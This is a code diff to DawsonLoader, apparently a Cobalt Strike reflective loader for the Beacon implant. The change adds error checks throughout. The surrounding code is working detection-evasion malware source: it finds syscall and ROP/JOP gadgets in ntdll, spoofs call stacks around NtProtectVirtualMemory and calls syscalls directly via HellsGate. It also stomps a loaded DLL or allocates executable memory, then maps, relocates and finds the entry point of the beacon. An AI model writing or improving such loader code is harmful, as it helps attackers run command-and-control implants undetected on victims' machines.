@@ -51,12 +51,26 @@ void * DawsonLoader()
     BYTE syscall_gadget_bytes[] = {0x0F,0x05,0xC3};
     void * syscall_gadget = FindGadget((LPBYTE)ntdll->text_section, ntdll->text_section_size, syscall_gadget_bytes, sizeof(syscall_gadget_bytes));
 
+    // ========== ERROR CHECK: Syscall gadget discovery ==========
+    if (!syscall_gadget) {
+        // Critical error: syscall gadget not found in ntdll
+        // Cannot proceed without syscall instruction
+        return NULL;
+    }
+
     // ========== JOPCALL INTEGRATION - Initialize ROP/JOP Gadget Chain ==========
     // Discover gadgets in ntdll for return address obfuscation
     // This only runs once and gadgets are reused for all syscalls
-    static GadgetChain rop_chain = {0};
+    // Note: Explicitly initialized to avoid .bss section (Cobalt Strike COFF parser issue)
+    static GadgetChain rop_chain = {{NULL, NULL, NULL, NULL, NULL}, 0};
     if (rop_chain.count == 0) {
-        find_rop_gadgets(ntdll, &rop_chain);
+        BOOL gadget_result = find_rop_gadgets(ntdll, &rop_chain);
+        // ========== ERROR CHECK: Gadget discovery ==========
+        if (!gadget_result || rop_chain.count == 0) {
+            // Critical error: ROP/JOP gadgets not found
+            // Cannot proceed without gadgets for call stack obfuscation
+            return NULL;
+        }
     }
 
     getApis(api);
@@ -67,11 +81,18 @@ void * DawsonLoader()
     // Check if DLL Module stomping option is enabled from the C2 profile via allocator code 0x4 written by UDRL Aggressor script
     if ((*(WORD *)((BYTE*)raw_beacon->dllBase + 0x40)) == 0x4){
         base = api->LoadLibraryExA(((BYTE*)raw_beacon->dllBase+0x44),0,1);
+
+        // ========== ERROR CHECK: LoadLibraryExA for DLL stomping ==========
+        if (!base) {
+            // Critical error: LoadLibraryExA failed to load target DLL
+            return NULL;
+        }
+
         // write our .text section at DLL+0x4000 (first 0x1000 is the uncopied header)
         base = ((BYTE*)base + 0x3000);
         oldprotect = 0;
         if(base){
-            // Add some extra size 
+            // Add some extra size
             size = raw_beacon->size + 0x2000;
             oldprotect = 0;
             // NtProtectVirtualMemory syscall via ROP chain
@@ -88,6 +109,14 @@ void * DawsonLoader()
         size = ((BYTE*)raw_beacon->size + 0x10000);
         ULONG_PTR align = 0xFFFFFFFFFFFFF000;
         base = api->HeapAlloc(api->GetProcessHeap(),0x8,size); // 0x8 = zero out heap memory
+
+        // ========== ERROR CHECK: HeapAlloc ==========
+        if (!base) {
+            // Critical error: HeapAlloc failed
+            // Cannot proceed without allocated memory
+            return NULL;
+        }
+
         base = (void*)((BYTE*)base + 0x2000);
         base = (void*)((ULONG_PTR)base & align);
         if(base){
@@ -104,26 +133,36 @@ void * DawsonLoader()
         size = raw_beacon->size;
 
         hMapFile = api->CreateFileMappingA(NtCurrentProcess(),0,PAGE_EXECUTE_READWRITE,0,size,0);
-        if(hMapFile){
-            base = api->MapViewOfFile(hMapFile,0xF003F,0,0,0);
-            if(base){
-                oldprotect = 0;
-                virtual_beacon->dllBase = base;
-                spoof_struct->ssn = getSyscallNumber(api->pNtProtectVirtualMemory);
-                base = spoof_synthetic_callstack(
-                    NtCurrentProcess(),                     // Argument # 1
-                    &base,                                  // Argument # 2
-                    &size,                                  // Argument # 3
-                    raw_beacon->BeaconMemoryProtection, // Argument # 4
-                    spoof_struct,                           // Pointer to Spoof Struct 
-                    syscall_gadget,                         // Pointer to API Call
-                    (void *)1,                              // Number of Arguments on Stack (Args 5+)
-                    &oldprotect                             // Argument ++
-                ); 
-                // HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
-                // ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
-            }
+        // ========== ERROR CHECK: CreateFileMappingA ==========
+        if(!hMapFile){
+            // Critical error: CreateFileMappingA failed
+            return NULL;
         }
+
+        base = api->MapViewOfFile(hMapFile,0xF003F,0,0,0);
+        // ========== ERROR CHECK: MapViewOfFile ==========
+        if(!base){
+            // Critical error: MapViewOfFile failed
+            return NULL;
+        }
+
+        oldprotect = 0;
+        virtual_beacon->dllBase = base;
+        spoof_struct->ssn = getSyscallNumber(api->pNtProtectVirtualMemory);
+        // Call NtProtectVirtualMemory via spoof_synthetic_callstack
+        // Don't assign return value - it returns NTSTATUS, not a pointer!
+        spoof_synthetic_callstack(
+            NtCurrentProcess(),                     // Argument # 1
+            &base,                                  // Argument # 2
+            &size,                                  // Argument # 3
+            raw_beacon->BeaconMemoryProtection, // Argument # 4
+            spoof_struct,                           // Pointer to Spoof Struct
+            syscall_gadget,                         // Pointer to API Call
+            (void *)1,                              // Number of Arguments on Stack (Args 5+)
+            &oldprotect                             // Argument ++
+        );
+        // HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
+        // ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
     }
     else{
         // Allocate new memory to write our new RDLL too
@@ -133,20 +172,42 @@ void * DawsonLoader()
         // Note: Using HellsGate/HellDescent for this complex syscall for now
         // TODO: Extend jop_syscall to handle 6+ arguments
         HellsGate(getSyscallNumber(api->pNtAllocateVirtualMemory));
-        ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, raw_beacon->BeaconMemoryProtection);
+        NTSTATUS status = ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, raw_beacon->BeaconMemoryProtection);
+
+        // ========== ERROR CHECK: Memory allocation ==========
+        if (status != 0 || !base) {
+            // Critical error: NtAllocateVirtualMemory failed
+            // NTSTATUS error code in 'status', cannot proceed
+            return NULL;
+        }
+
         RtlSecureZeroMemory(base,size); // Zero out the newly allocated memory
 
         virtual_beacon->dllBase = base;
     }
  
-    checkObfuscate(raw_beacon); 
+    // ========== ERROR CHECK: Memory allocation verification ==========
+    if (!virtual_beacon->dllBase) {
+        // Critical error: No valid memory allocated for beacon
+        // All allocator methods failed, cannot proceed
+        return NULL;
+    }
+
+    checkObfuscate(raw_beacon);
 
     doSections(virtual_beacon, raw_beacon);
     doImportTable(api, virtual_beacon, raw_beacon);
     doRelocations(api, virtual_beacon, raw_beacon);
-   
+
     // Get the entry point for beacon located in the .text section
     virtual_beacon->EntryPoint = checkFakeEntryAddress_returnReal(raw_beacon, virtual_beacon);
+
+    // ========== ERROR CHECK: Entry point validation ==========
+    if (!virtual_beacon->EntryPoint) {
+        // Critical error: Invalid entry point
+        // Beacon cannot execute without valid entry point
+        return NULL;
+    }
 
     // If beacon.text is not RWX, change memory protections of virtual beacon.text section to RX
     if(raw_beacon->BeaconMemoryProtection == PAGE_READWRITE){
